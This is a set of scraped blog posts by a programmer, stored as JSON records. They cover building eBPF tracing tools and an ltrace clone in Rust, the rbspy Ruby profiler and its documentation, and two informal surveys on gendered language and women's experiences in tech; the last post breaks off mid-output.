{"url": "https://jvns.ca/blog/2018/02/05/rust-bcc/", "title": "Writing eBPF tracing tools in Rust", "content": "\n     \n\n tl;dr: I made an experimental Rust repository that lets you write BPF tracing tools from Rust! It’s\nat  https://github.com/jvns/rust-bcc  or  https://crates.io/crates/bcc , and has a couple of hopefully\neasy to understand examples. It turns out that writing BPF-based tracing tools in Rust is really\neasy (in some ways easier than doing the same things in Python). In this post I’ll explain why I\nthink this is useful/important. \n\n For a long time I’ve been interested in the  BPF compiler collection ,\na C -> BPF compiler, C library, and Python bindings to make it easy to write tools like: \n\n \n opensnoop  (spies on which files\nare being opened) \n tcplife  (track length of TCP\nconnections) \n cpudist  (count how much time every\nprogram spends on- and off-CPU) \n \n\n and a lot more. The list of available tools in\n the /tools directory \nis really impressive and I could write a whole blog post about that.\nIf you’re familiar with dtrace – the idea is that BCC is a little bit like dtrace, and in fact\nthere’s a dtrace-like language  named ply  implemented with BPF. \n\n This blog post isn’t about  ply  or the great BCC tools though – it’s about what tools we need to\nbuild more complicated/powerful BPF-based programs. \n\n What does the BPF compiler collection let you do? \n\n Here’s a quick overview of what BCC lets you do: \n\n \n compile  BPF programs from C into eBPF bytecode. \n attach  this eBPF bytecode to a userspace function or kernel function (as a “uprobe” / “kprobe”) or install it as XDP \n communicate  with the eBPF bytecode to get information with it \n \n\n A basic example of using BCC is this\n strlen_count.py  program\nand I think it’s useful to look at this program to understand how BCC works and how you might be\nable to implement more advanced tools. \n\n First, there’s an eBPF program. This program is going to be attached to the  strlen  function from\nlibc (the C standard library) – every time we call  strlen , this code will be run. \n\n This eBPF program \n\n \n gets the first argument to the  strlen  function (the address of a string) \n reads the first 80 characters of that string (using  bpf_probe_read ) \n increments a counter in a hashmap (basically  counts[str] += 1 ) \n \n\n The result is that you can count every call to  strlen . Here’s the eBPF program: \n\n struct key_t {\n    char c[80];\n};\nBPF_HASH(counts, struct key_t);\nint count(struct pt_regs *ctx) {\n    if (!PT_REGS_PARM1(ctx))\n        return 0;\n    struct key_t key = {};\n    u64 zero = 0, *val;\n    bpf_probe_read(&key.c, sizeof(key.c), (void *)PT_REGS_PARM1(ctx));\n    val = counts.lookup_or_init(&key, &zero);\n    (*val)++;\n    return 0;\n};\n \n\n After that program is compiled, there’s a Python part which does  b.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")  –\nit tells the Linux kernel to actually attach the compiled BPF to the  strlen  function so that it\nruns every time  strlen  runs. \n\n The really exciting thing about eBPF is what comes next – there’s no use keeping a hashmap of\nstring counts if you can’t access it! BPF has a number of data structures that let you share\ninformation between BPF programs (that run in the kernel / in uprobes) and userspace. \n\n So in this case the Python program accesses this  counts  data structure. \n\n BPF data structures: hashmaps, buffers, and more! \n\n There’s a great list of available BPF data structures in the  BCC reference guide . \n\n There are basically 2 kinds of BPF data structures – data structures suitable for storing\n statistics  (BPF_HASH, BPF_HISTOGRAM etc), and data structures suitable for storing  events \n(like BPF_PERF_MAP) where you send a stream of events to a userspace program which then displays\nthem somehow. \n\n There are a lot of interesting BPF data structures (like a trie!) and I haven’t fully worked out\nwhat all of the possibilities are with them yet :) \n\n What I’m interested in: BPF for profiling & tracing \n\n Okay!! We’re done with the background, let’s talk about why I’m interested in BCC/BPF right now. \n\n I’m interested in using BPF to implement profiling/tracing tools for dynamic programming languages,\nspecifically tools to do things like “trace all memory allocations in this Ruby program”. I think\nit’s exciting that you can say “hey, run this tiny bit of code every time a Ruby object is\nallocated” and get data back about ongoing allocations! \n\n Rust: a way to build more powerful BPF-based tools \n\n The issue I see with the Python BPF libraries (which are GREAT, of course) is that while they’re\nperfect for building tools like  tcplife  which track tcp connnection lengths, once you want to\nstart doing more complicated experiments like “stream every memory allocation from this Ruby program,\ncalculate some metadata about it, query the original process to find out the class name for that\naddress, and display a useful summary”, Python doesn’t really cut it. \n\n So I decided to spend 4 days trying to build a BCC library for Rust that lets you attach + interact\nwith BPF programs from Rust! \n\n Basically I worked on porting  https://github.com/iovisor/gobpf  (a go BCC library) to Rust. \n\n The easiest and most exciting way to explain this is to show an example\nof what using the library looks like. \n\n Rust example 1: strlen \n\n Let’s start with the strlen example from above. Here’s\n strlen.rs  from the examples! \n\n Compiling & attaching the  strlen  code is easy: \n\n let mut module = BPF::new(code)?;\nlet uprobe_code = module.load_uprobe(\"count\")?;\nmodule.attach_uprobe(\"/lib/x86_64-linux-gnu/libc.so.6\", \"strlen\", uprobe_code, -1 /* all PIDs */)?;\nlet table = module.table(\"counts\");\n \n\n This table contains a hashmap mapping strings to counts. So we need to iterate over that table and\nprint out the keys and values. This is pretty simple: it looks like this. \n\n let iter = table.into_iter();\nfor e in iter {\n    // key and value are each a Vec<u8> so we need to transform them into a string and \n    // a u64 respectively\n    let key = get_string(&e.key);\n    let value = Cursor::new(e.value).read_u64::<NativeEndian>().unwrap();\n    println!(\"{:?} {:?}\", key, value);\n}\n \n\n Basically all the data that comes out of a BPF program is an opaque  Vec<u8>  right now, so you need\nto figure out how to decode them yourself. Luckily decoding binary data is something that Rust is\nquite good at – the  byteorder  crate lets you easily decode  u64 s, and translating a vector of\nbytes into a String is easy (I wrote a quick  get_string  helper function to do that). \n\n I thought this was really nice because the code for this program in Rust is basically exactly the\nsame as the corresponding Python version. So it very pretty approachable to start doing experiments\nand seeing what’s possible. \n\n Reading perf events from Rust \n\n The next thing I wanted to do after getting this  strlen  example to work in rust was to handle\nevents!! \n\n Events are a little different / more complicated.\nThe way you stream events in a BCC program is – it uses  perf_event_open  to create a ring buffer\nwhere the events get stored. \n\n Dealing with events from a perf ring buffer normally is a huge pain because perf has this\ncomplicated data structure. The C BCC library makes this easier for you by letting you specify a C\ncallback that gets called on every new event, and it handles dealing with perf. This is super\nhelpful. To make this work with Rust, the  rust-bcc  library lets you pass in a Rust closure to run\non every event. \n\n Rust example 2: opensnoop.rs (events!!) \n\n To make sure reading BPF events actually\nworked, I implemented a basic version of  opensnoop.py  from the iovisor bcc tools:  opensnoop.rs . \n\n I won’t walk through the  C code  in this case because there’s a lot of it but basically the eBPF\nC part generates an event every time a file is opened on the system. I copied the C code verbatim\nfrom  opensnoop.py . \n\n Here’s the type of the event that’s generated by the BPF code: \n\n #[repr(C)]\nstruct data_t {\n    id: u64, // pid + thread id\n    ts: u64,\n    ret: libc::c_int,\n    comm: [u8; 16], // process name\n    fname: [u8; 255], // filename\n}\n \n\n The Rust part starts out by compiling BPF code & attaching kprobes (to the  open  system call in the\nkernel,  do_sys_open ). I won’t paste that code here because it’s basically the same as the  strlen \nexample. What happens next is the new part: we install a callback with a Rust closure\non the  events  table, and then call  perf_map.poll(200)  in a loop. The design of the BCC library\nis a little confusing to me still, but you need to repeatedly poll the perf reader objects to make\nsure that the callbacks you installed actually get called. \n\n let table = module.table(\"events\");\nlet mut perf_map = init_perf_map(table, perf_data_callback)?;\nloop {\n    perf_map.poll(200);\n}\n \n\n This is the callback code I wrote, that gets called every time. Again, it takes an opaque  Vec<u8> \nevent and translates it into a  data_t  struct to print it out.  Doing this is kind of annoying (I\nactually called  libc::memcpy  which is Not Encouraged Rust Practice), I need to figure out a less\ngross/unsafe way to do that. The really nice thing is that if you put  #[repr(C)]  on your Rust\nstructs it represents them in memory the exact same way C will represent that struct. So it’s quite\neasy to share data structures between Rust and C. \n\n fn perf_data_callback() -> Box<Fn(Vec<u8>)> {\n    Box::new(|x| {\n        // This callback\n        let data = parse_struct(&x);\n        println!(\"{:-7} {:-16} {}\", data.id >> 32, get_string(&data.comm), get_string(&data.fname));\n    })\n}\n \n\n You might notice that this is actually a weird function that returns a callback – this is because I\nneeded to install 4 callbacks (1 per CPU), and in stable Rust you can’t copy closures yet. \n\n output \n\n Here’s what the output of that  opensnoop  program looks like! \n\n This is kind of meta – these are the files that were being opened on my system when I saved this\nblog post :). You can see that git is looking at some files, vim is saving a file, and my static\nsite generator Hugo is opening the changed file so that it can update the site. Neat! \n\n PID     COMMAND          FILENAME\n   8519 git              /home/bork/work/homepage/.gitmodules\n   8519 git              /home/bork/.gitconfig\n   8519 git              .git/config\n  22877 vim              content/post/2018-02-05-writing-ebpf-programs-in-rust.markdown\n  22877 vim              .\n   7312 hugo             /home/bork/work/homepage/content/post/2018-02-05-writing-ebpf-programs-in-rust.markdown\n   7312 hugo             /home/bork/work/homepage/content/post/2018-02-05-writing-ebpf-programs-in-rust.markdown\n \n\n using rust-bcc to implement Ruby experiments \n\n Now that I have this basic library that I can use I can get counts + stream events in Rust, I’m\nexcited about doing some experiments with making BCC programs in Rust that talk to Ruby programs! \n\n The first experiment (that I blogged about last week) is\n count-ruby-allocs.rs \nwhich prints out a live count of current allocation activity. Here’s an example of what it prints\nout: (the numbers are counts of the number of objects allocated of that type so far). \n\n       RuboCop::Token 53\n      RuboCop::Token 112\n           MatchData 246\nParser::Source::Rang 255\n                Proc 323\n          Enumerator 328\n                Hash 475\n               Range 1210\n                 ??? 1543\n              String 3410\n               Array 7879\nTotal allocations since we started counting: 16932\nAllocations this second: 954\n \n\n Related work \n\n Geoffrey Couprie is interested in building more advanced BPF tracing tools with Rust\ntoo and wrote a great blog post with a cool proof of concept:\n Compiling to eBPF from Rust . \n\n I think the idea of not requiring the user to compile the BPF program is exciting, because you could\nimagine distributing a statically linked Rust binary (which links in libcc.so) with a pre-compiled\nBPF program that the binary just installs and then uses to do cool stuff. \n\n Also there’s another Rust BCC library at  https://bitbucket.org/photoszzt/rust-bpf/ \nat which has a slightly different set of capabilities than\n jvns/rust-bcc  (going to spend some time looking at that one\nlater, I just found about it like 30 minutes ago :)). \n\n that’s it for now \n\n This crate is still extremely sketchy and there are bugs & missing features but I wanted to put it\non the internet because I think the examples of what you can do with it are really exciting!! \n\n"},
{"url": "https://jvns.ca/blog/2013/12/27/guys-guys-guys/", "title": "When is \"guys\" gender neutral? I did a survey!", "content": "\n     \n\n The other day I was having a discussion with someone about whether or\nnot “guys” was a gender-neutral term. This person said “my friends\ntotally think it is!“, and I verified with my friends, who totally\nsaid it wasn’t. Not the best grounds for a discussion. \n\n So I ran a slightly-more-scientific survey. Here are\n the survey questions ,\nwhich you can still answer if you like. This resulted in\n a bunch of discussion on Twitter ,\nwhich was at least as interesting as the survey results. Lots of\npeople wanted to know the results, so here they are! About 2300 people\nreplied. \n\n You can download the entire result set from the\n GitHub repository . \n\n Here’s a summary of the survey results. I’ve split it up by gender: I\nasked each person “Do you identify as a woman?”, so I’ve split the\ncategories into “Women”, and “Men + Other”. \n\n The main thing I find interesting here is how women and men perceive\nthese words differently: about 50% of men (+ other) think that “Java\nguys” is gender neutral, while only 25% of women do. There’s a similar\nsplit for “Python guy” and “Erlang guy”. \n\n The image probably appears too small here: click for the bigger image. \n\n \n\n Here’s the gender distribution: \n\n \n\n Issues with the survey \n\n This really isn’t meant to be a scientific study or anything – think\nof it as informally polling a few of your friends, except if you had a\nlot of friends. But here are some of the science issues: \n\n \n The gender split question could be better. Specifically, I’d use:\n“How do you identify? m/f/other”. \n There’s tons of selection bias, because the survey was only\ndistributed through Twitter retweets. \n The framing of the survey is pretty biased – I said things like\n“someone is trying to convince me that ‘guys’ is a gender neutral\nterm” in my tweets about the survey. \n People could optionally fill in where they were from, but I ignored\nthat information. \n There are a lot of shades of grey: ideally people would rate each\nsentence on a 5-point scale or something. \n \n\n I think presenting this as a survey was a great way to get people to\nengage in a discussion in a mostly non-heated way and think about the\nway they use language. \n\n Several people told me that they thought that “guys” was a totally\ngender-neutral term and were surprised by their results when they took\nthe survey. Awesome! A++ would survey again. \n\n"},
{"url": "https://jvns.ca/blog/2018/02/24/an-ltrace-clone-using-ebpf/", "title": "Prototyping an ltrace clone using eBPF", "content": "\n     \n\n A few weeks ago on twitter, Leandro Pereira  suggested  building a clone of ltrace using eBPF + bcc. \n\n Yesterday and today I hacked together a prototype of an ltrace clone using eBPF + bcc! It’s on\nGitHub  and it’s called  ltrace-bcc . I think it’s pretty cool\nso here’s a post about how it works!  This prototype uses the bcc crate for\nRust ( https://github.com/jvns/rust-bcc ) that I started building a few weeks ago. \n\n The code is all in  https://github.com/jvns/ltrace-bcc/blob/master/src/main.rs , it’s like 200 lines\nand I thought it was cool that it was possible to implement such a cool thing in so little code so I\nwanted to explain how it works! \n\n what’s ltrace? \n\n ltrace is a program that traces library calls. You run  ltrace your-command , and ltrace will tell\nyou what C functions (for example from libc) that command called! Here’s an example of running\nltrace on  ls  and seeing it get a bunch of environment variables. \n\n $ ltrace ls\n...\ngetenv(\"QUOTING_STYLE\")                          = nil\ngetenv(\"COLUMNS\")                                = nil\nioctl(1, 21523, 0x7ffcfffdc7d0)                  = -1\ngetenv(\"TABSIZE\")                                = nil\ngetopt_long(1, 0x7ffcfffdcc38, \"abcdfghiklmnopqrstuvw:xABCDFGHI:\"..., 0x414dc0, -1) = -1\ngetenv(\"LS_BLOCK_SIZE\")                          = nil\ngetenv(\"BLOCK_SIZE\")                             = nil\ngetenv(\"BLOCKSIZE\")                              = nil\ngetenv(\"POSIXLY_CORRECT\")                        = nil\ngetenv(\"BLOCK_SIZE\")                             = nil\n \n\n This is neat because it’s a way to spy on what a program is doing that’s different from spying on\nits system calls! \n\n problems with ltrace \n\n The main problem I have with ltrace is that even though there’s a  -p  option (“Attach  to the\nprocess with the process ID pid and begin tracing”), I don’t think I’ve ever been able to get that\noption to work. When I run  sudo ltrace -p SOME_PID , nothing happens, even though I’m pretty sure\nthe process I’m tracing is calling library functions. \n\n I don’t fully understand  why  ltrace can’t attach to processes, but that’s not what this post is\nabout. \n\n The other problem is that it introduces a lot of performance overhead (for the same reason that\nstrace does: it works using ptrace)! If I run the same program with and without ltrace, the ltraced\nversion will be way slower. \n\n goal: write a clone of ltrace that can attach to a running process \n\n So I wanted to try to write an ltrace clone that could attach to a running process! I figured that I\ncould\nprototype this pretty easily with the  rust bpf library  I worked\non a few weeks ago. \n\n Using eBPF + bcc to do tracing is in general faster than using ptrace to do tracing (which is what\nltrace does) so this approach should also be lower overhead and maybe more suitable for production\nuse. \n\n how does ltrace work? \n\n If we’re going to try to write an ltrace clone, we need to understand how ltrace works at least a\nlittle! The packagecloud blog has (among a lot of other great systems posts), a good post called  How does ltrace work?  that explains. I won’t rehash that whole post here, but here are the key points: \n\n \n ltrace only traces dynamically linked functions (functions that are run from a dynamically loaded\nlibrary, like libc or something) \n to get a list of which functions to trace, ltrace parses the process’s ELF file (looking at the\nPLT “Procedure Linkage Table”) \n ltrace inserts a breakpoint for each of those functions \n \n\n We’re not going to insert a breakpoint, so we can ignore everything about that. But we  do  need\nto get a list of which functions to trace! \n\n getting a list of dynamically linked functions in a program \n\n How can we find out which functions are dynamically linked into a program? That sounds hard. \n\n It turns out it’s not hard!!!!!!!! Basically if we run  readelf -a  we can find a bunch of function\nnames in the sections  rela.dyn  and  rela.plt , and that lists the functions. It’s not clear to me\nwhat the difference between those two are yet. Some binaries seem to not have a  .rela.plt  section. \n\n In Rust, this is literally 10 lines of code (+ comments :)). Here’s some code that takes a filename\nand prints out all the dynamically linked function names: \n\n fn print_dynamic_functions(filename: &str) -> Result<(), Error> {\n    // Read the file\n    let mut contents: Vec<u8> = vec![];\n    let mut elf = File::open(filename)?;\n    elf.read_to_end(&mut contents)?;\n\n    // parse the ELF using the goblin crate\n    let binary = goblin::elf::Elf::parse(&contents).context(\"failed to parse ELF file\")?;\n    // load the function names from the `.rela.dyn` section\n    for dynrel in binary.dynrelas {\n        // we need to look up the symbol name (function name) in `binary.dynsyms` and\n        // `binary.dynstrtab`.\n        let sym = binary.dynsyms.get(dynrel.r_sym).unwrap();\n        let name = binary.dynstrtab.get(sym.st_name).unwrap()?;\n        println!(\"{:?}\", name);\n    }\n    Ok(())\n}\n \n\n using eBPF to trace functions \n\n Okay, so once we have a list of functions that we want to trace, how do we actually trace them?\nThe way eBPF + uprobes work is – you ask the Linux kernel to attach some eBPF code (that you write)\nto a userspace function (for example  strlen  or something), and then that code can send some data\nback to userspace. \n\n Basically I wrote a super simple template that just saves  name into a struct and then sends the\nevent, and then replaced  NAME  with the name of every function I want to trace. So we generate\n trace_fun_strlen ,  trace_fun_strcpy , etc. \n\n let template = \"\n    int trace_fun_NAME(struct pt_regs *ctx) {\n    struct data_t data = {};\n    strcpy(data.function_name, \\\"NAME\\\");\n    events.perf_submit(ctx, &data, sizeof(data));\n    return 0;\n};\";\nfor name in &functions {\n    bpf_code += &template.replace(\"NAME\", &name);\n}\n \n\n Once we have a  trace_fun_strlen  function (which will submit an event every time it’s called), we\nneed to attach it to the  strlen  function in libc. That’s super easy: \n\n for name in &functions {\n    let uprobe_name = &format!(\"trace_fun_{}\", name);\n    let uprobe_code = module.load_uprobe(uprobe_name)?;\n    module.attach_uprobe(library, name, uprobe_code, pid);;\n}\n \n\n getting the data back from eBPF \n\n Getting the messages back about which functions were called is super easy – we just need to set up\na callback to print them out and then install the callback. here’s what the code looks like in Rust: \n\n int main {\n    /* initial setup here */\n    let table = module.table(\"events\");\n    let mut perf_map = init_perf_map(table, perf_data_callback)?;\n    loop {\n        perf_map.poll(200);\n    }\n}\n\nfn perf_data_callback() -> Box<FnMut(&[u8]) + Send> {\n    Box::new(|x| {\n        let data = parse_struct(x);\n        println!(\"{}({} [{}],{},{})\", get_string(&data.function_name), data.arg1, get_string(&data.arg1_contents), data.arg2, data.arg3);\n    })\n}\n \n\n it works!! \n\n Here are a couple of examples of using this ltrace prototype on a running Firefox process to figure\nout what it’s doing. I traced its calls to the pthread library and its calls to  libc . I think it’s\ncool that we can see it locking and unlocking mutexes – like you can see that each\n pthread_mutex_lock   is followed with a corresponding  pthread_muted_unlock  on the same address.\nFor the calls to  strlen , I made it read the string at the address of the first argument, so you\ncan see what string it’s calculating the length of. \n\n $ sudo ./target/debug/ltrace-bcc 16173 \nPossible libraries:\n/lib/x86_64-linux-gnu/libpthread.so.0\n/lib/x86_64-linux-gnu/libdl.so.2\n/usr/lib/x86_64-linux-gnu/libstdc++.so.6\n/lib/x86_64-linux-gnu/libm.so.6\n/lib/x86_64-linux-gnu/libgcc_s.so.1\n/lib/x86_64-linux-gnu/libc.so.6\n \n\n $ sudo ./target/debug/ltrace-bcc 16173 /lib/x86_64-linux-gnu/libpthread.so.0\npthread_mutex_unlock(140089540628720 [],0,140088461202304)\npthread_mutex_lock(140089913674096 [],140737445204276,0)\npthread_mutex_lock(140089539698712 [],0,0)\n__errno_location(0 [],140737445203776,4294967295)\npthread_mutex_unlock(140089539698712 [],0,0)\npthread_mutex_lock(140089539698712 [],176,140737445204088)\npthread_mutex_unlock(140089539698712 [],176,140737445204088)\npthread_mutex_unlock(140089913674096 [],0,140089539698712)\n\n$ sudo ./target/debug/ltrace-bcc 16173 /lib/x86_64-linux-gnu/libc.so.\nclock_gettime(1 [],140737445202992,140088477396416)\nstrlen(140089705923984 [@mozilla.org/docshel],1,140089939581568)\nstrlen(140088631952416 [moz-extension://b6ba],140088631952384,4294967295)\nstrlen(140088469545224 [moz-extension://b6ba],140737445188512,140737445188504)\nclock_gettime(1 [],140737445188400,0)\n \n\n writing debugging tools in Rust is fun \n\n I think this is a cool example of why I’m excited about Rust – like I got this idea to try to work\non an ltrace clone, and in a couple of days I had a prototype of something that kinda works! \n\n It makes me happy that libraries to do things like parse ELF (goblin!!) are really easily available\nin Rust! The definition of the  ELF struct from the goblin crate  to me\nis a thing of beauty – it just has everything I might to know about an ELF file in it! \n\n Previously I was using the elf crate to parse ELF files but the goblin crate is WAY better, it has\nsupport for parsing things like relocations (the  .rela.dyn  section) which the  elf  crate didn’t. \n\n I like that Rust crates generally don’t try to make things simpler or harder than they are – like\nthey don’t introduce unnecessary abstractions, they just make it relatively easy for you get the\ninformation you need. \n\n"},
{"url": "https://jvns.ca/blog/2018/03/26/rbspy-docs/", "title": "Documentation site for rbspy!", "content": "\n     \n\n Hello!! Latest update on my Ruby profiler: I published a documentation site!! It’s at\n https://rbspy.github.io . \n\n I wanted to do a good job of this because my view about documentation is – if software isn’t well\ndocumented, it might as well not exist. I’ve spent SO MUCH time explaining other people’s software\non this blog, so I figured it was extra important to make sure the software I write is well\nexplained. \n\n It has all the usual things: what is this software? How does it work? It also has a few extra things\nthat I don’t always see on documentation sites though. \n\n stackprof vs ruby \n\n Extra thing 1: there’s a comparison ( rbspy vs stackprof ) between rbspy and  stackprof ,\nanother Ruby profiler. This is not because rbspy is awesome and stackprof is bad (stackprof is very\nuseful!), but because rbspy and stackprof are useful in  different situations  and so I wanted to\nexplain when you should use each one! \n\n guide to profiling in general \n\n The other extra thing I included is a small  guide to profiling . This is because\nI’ve heard from a lot of people who want to make their programs faster that they’re confused about\nsome of the basics of profiling – what’s the difference between a benchmark and a profiler? What’s\na flamegraph and how do I interpret it? \n\n All of this documentation could actually apply to  any  profiling tool, not just rbspy. Here’s are\nthe pages from the guide to profiling: \n\n \n Questions to ask while optimizing \n Benchmarking your code \n Using flamegraphs \n \n\n how I made the docs site \n\n I wanted to have a really simple, pretty minimalist site. Nothing fancy! I did want it to feel like\nthere was a little bit of care put into it, though. Here’s how I did it. \n\n I used  Hugo , which is my favorite static site generator. It’s what I use for\nthis blog as well. \n\n Next, I used the  Crisp theme , which I found by searching for\n“minimalist” on the Hugo themes site. It’s already responsive, which was good – I wanted the site\nto work on mobile. \n\n Then I manually edited the HTML/CSS in theme a bit to get what I wanted. The main change I made was\nto add a hamburger menu on mobile to make it (hopefully) easier to navigate. I used  this example .  My CSS skills aren’t great (I’ve only written\nHTML/CSS for tiny projects like this) so I was pretty proud of myself for getting the hamburger menu\nworking :) \n\n Here’s what the site looks like on mobile! Look, responsive! :D \n\n \n\n Let me know if you have questions about rbspy! \n\n If there are questions you have about using rbspy that this docs site doesn’t answer, please let me\nknow!!  I think documentation is really important, and if you have a question probably other people\ndo too :). I’d love to add to the  FAQ . \n\n I’m julia@jvns.ca, or  @b0rk  on Twitter. \n\n"},
{"url": "https://jvns.ca/blog/2014/11/11/the-best-thing-ive-ever-read-about-women-in-technology/", "title": "What women in technology really think (150 of them, at least)", "content": "\n      spoiler: EVERYONE IS DIFFERENT AND PEOPLE THINK LOTS OF DIFFERENT\nTHINGS \n\n I’ve read tons of articles about or by women who work as developers. I\nread a thing yesterday and it was the best thing I’ve ever read.\nYesterday I found a link to  a survey on Twitter \nasking for the experiences of women who work in technology, and did the\nsurvey. There’s question at the end that asks \n\n Any other comments you’d like to make? \n\n I didn’t think much of it at the time – I said something (that I’ve had\nan incredibly good experience, but that it makes me very angry that\nother people have bad experiences). But then I looked at  everyone\nelse’s responses . It’s an amazing example of a wide range of women’s\nopinions and experiences, and I think you should read it. I’ve formatted\n all of the responses to that question  a little\nbetter, or you can see\n the full survey results . \n\n \n\n There are lots of negative comments, from women who are harassed or\ndisrespected at work. We have a lot of work to do. But there are also a\nton of very positive comments, from women who have supportive colleagues\nand mentors and enjoy their work and who feel respected. \n\n I also loved the answers to  What do (or did) you like best about\nworking in tech? : the two most popular answers were  “I enjoy the\nactual work”  and  “I like solving problems that are really difficult” .\n(about 75% of people). ME TOO THAT’S HOW I FEEL <3 \n\n Here are a few excerpts that I found particularly interesting: (though\nbasically every response is interesting, and I think you should read\nthem all.) \n\n \n I feel that being female and over 40 has made my career feel much more\ntenuous. I worry that if I lost my job I wouldn’t be able to be hired\nagain in my field. \n\n I personally have not had many issues arise due to gender, but I feel\nthis is largely because I tend to behave in a very male way by natural\ninclination. I tend not to notice or be disturbed by behaviour many\nwomen find inappropriate or intimidating. I don’t think it’s rare or\nacceptable, just not something I feel worried about for myself. It\ndoes frustrate me a lot to see other women experience it though. \n\n For years I could say I had never felt or been held back in tech\nbecause of my gender. That is no longer the case. \n\n I feel like I’ve had things pretty easy, in part because I often get\nalong as “one of the guys.” \n\n Currently very very happy in a great, friendly and supportive\nenvironment (being female, a mother, and part-time hasn’t stopped me\ngetting promoted) - so they do exist! \n\n I have a  great  working environment. […] Interestingly, we do have\n one engineer in particular who can be loud and overbearing and could,\n if given enough power, make the environment somewhat hostile – but\n that’s exactly why no one gives him that power. \n\n I’ve experienced as much discrimination from female groups as I have\nfrom male-dominated organizations. \n\n As of this past September, I’ve been 40 years in tech. It distresses\nme that: 1. the situation of women in tech has gotten worse, but 2: a\nlot of the women younger than I are behaving as if the problems\nthey’re facing are new ones, and don’t look to the past to see what\nworks/doesn’t work, thereby losing traction by repeating some of our\n(the older women’s) mistakes! \n\n I have been electrical engineer 31 years. Still feeling odd to be only\nwoman among colleagues \n\n I feel more comfortable in a mostly-male environment. Probably because\nthat’s how it was in my family, I had no sisters, but 3 brothers; and\nmy relationship with my mother wasn’t as great. \n\n I have no idea how much my male colleagues make. How are we supposed\nto find that out? \n\n I love this industry and I doubt I’ll ever leave it, but it has a long\nway to go in order for it to grow up. \n\n While I definitely recognize that this is some (maybe even a lot of)\nwomens’ experience, I felt somewhat misled when directed here from\nTwitter to take a survey about “women in tech.” Would love a survey\nsometime to focus on us and all the cool stuff what we’re actually\ndoing, rather than continuing to focus on aspects of tech that are\nprimary brought on by men. \n\n i feel like my employer might look the same as a really bad one based\non the checkmarks but it is actually an overwhelmingly supportive env\nand any inappropriate situations are dealt with very well. that they\ncome up in the first place is an industry wide issue - what\ndifferentiates companies is how they handle it. \n\n I feel extremely fortunate to had a very kind, feminist man as my\nph.d. supervisor. He made sure that myself and other aspiring women\nscientists were able to attend professional development seminars that\nwere specifically aimed at helping women overcome gender-related\ndiscrimination in our field. I hope that in my future career I can pay\nit forward and help younger women advance their careers. \n\n Ageism hits women harder than it does men. \n\n There’s definitely “bro-culture” at work. If you’re not one of the\nbros, forget about going to lunch with upper management, getting that\nraise, or getting the best projects. A female coworker of mine was\ntold to “just sit and look pretty” at a meeting once. \n\n I’m very lucky that I work at a company that highly values equality\nand works to make sure our environment is a healthy one for everyone,\nwith options for professional development and more. \n\n I think I’ve been quite fortunate in that I’ve worked at companies\nthat encourage and support women in tech. There have been individual\nmale colleagues who have at times made work life difficult but I\nalways felt like the company had my back. These individuals were\nspoken to by their managers and the issues were resolved. \n\n Where’s the option to say I feel great, valued, treated equally,\ncompetent and successful? \n\n Over the years, it was so subtle, but while men were promoted, I was\nsidelined and told I didn’t need additional leadership training. I\nwatched peers go to new heights while I perfected and elevated my\ncurrent role, but was never able to move beyond it because I was\nperceived as indispensable in that role, but it also locked me in away\nfrom management opportunities. \n\n Aside from my boss, the people at work are great and supportive. I\njust feel like I am not good enough of a programmer and I’m bringing\ndown the view of “women in tech.” I know that’s ridiculous and maybe\nit’s partially that it’s a bad job with work that I have a bitch of a\ntime being excited about. […] But the thing is, I genuinely enjoy\nprogramming for myself, and enjoy the culture (aside from the nasty\nstuff!) so I can’t see myself ever leaving that. \n\n Overall I’ve had an overwhelmingly positive experience as a woman in\ntech, and consider myself quite fortunate in that respect. I’m working\nin healthcare IT now, which has a great gender ratio and excellent\npeople and meaningful work. \n\n The tech industry is a great place to be and one day women will feel\njust as welcome as men to be in it. I hope I’ll get to see that day\nmyself. \n\n I realized recently that feeling “lucky” because I’ve only been\nsexually harassed by an executive once and denied access to a job once\n(that I know of) is insane. It might be getting off easy, but a guy\nwould have sued. I would leave tech if I had any other skillset. I’m\nover the frat boy air hockey culture. \n\n I genuinely had trouble thinking of women in tech I admired (aside\nfrom the two bosses I’ve had in the last 4 years, who are brilliant).\nI also got quite bummed out when I got to the question about my\nexperiences and realised exactly how many boxes I could tick. \n\n It wasn’t an option, but I have considered declining a perk at work,\nbecause I was afraid people would think it was a reward for a sexual\nfavor. I’m always worried that people will think I get ahead, not\nbecause my work is great (it is!), but because I use sex in some way. \n\n I’m so tired of being the only technical woman in the room. I’m tired\nof being the only woman in the room and having it assumed that someone\nbrought their admin. I’m tired of people talking to my husband (also a\nsoftware engineer) about technical things and trying to talk to me\nabout family (I’m just as technical as he is, and we don’t have kids).\nI’m tired of people asking when I’m going to leave the field as if\nit’s a given. I’m afraid that it is a given. \n \n\n These answers give me hope and also break my heart. I hope we can all\nmake our own organizations better, and make everyone feel more like \n\n \n “I feel great, valued, treated equally, competent and successful?” \n \n\n and less like \n\n \n “I’m tired of people asking when I’m going to leave the field as if\nit’s a given. I’m afraid that it is a given.“. \n \n"},
{"url": "https://jvns.ca/blog/2018/02/19/profiler-week-6-7--more-experiments--and-a--record--subcommand-/", "title": "Profiler week 6/7: more experiments, and a `report` subcommand!", "content": "\n     \n\n Hello! I didn’t write a profiler blog post last week, but I am writing one today! \n\n The most exciting thing that happened in the last few weeks is – I think rbspy  works . Like when I\nstarted out on this sabbatical, I was pretty worried that I wouldn’t be able to stabilize it and\nthat it would always be kind of buggy and unstable. \n\n I think it works, though! I haven’t gotten any new bug reports in a couple weeks, and all the bugs\nI’ve run into so far have been quite easy to fix. There is an issue where the Mac version is a\nlittle sketchy (because Mac systems programming is hard and I’m not planning to invest more time in\nit), but I feel good about the Linux version! \n\n I’m sure there are still bugs but it’s surprising and exciting to me that this program actually\nseems to be working for other people!! They can actually use it to profile their code! \n\n new feature:  rbspy report \n\n Recently I’ve mostly been working on rbspy user interface. I just merged a new feature called\n report ! \n\n The idea is – if you have a raw rbspy data file that you’ve previously recorded, you can use  rbspy\nreport  to generate different kinds of visualizations from it (the flamegraph/callgrind/summary\nformats, as documented above). This is useful because you can record raw data from a program and\nthen decide how you want to visualize it afterwards! \n\n For example, here’s what recording a simple program and then generating a text summary report looks\nlike: \n\n $ sudo rbspy record --raw-file raw.gz ruby ci/ruby-programs/short_program.rb\n$ rbspy report -f summary -i raw.gz -o summary.txt\n$ cat summary.txt\n% self  % total  name\n100.00   100.00  <c function> - unknown\n  0.00   100.00  ccc - ci/ruby-programs/short_program.rb\n  0.00   100.00  bbb - ci/ruby-programs/short_program.rb\n  0.00   100.00  aaa - ci/ruby-programs/short_program.rb\n  0.00   100.00  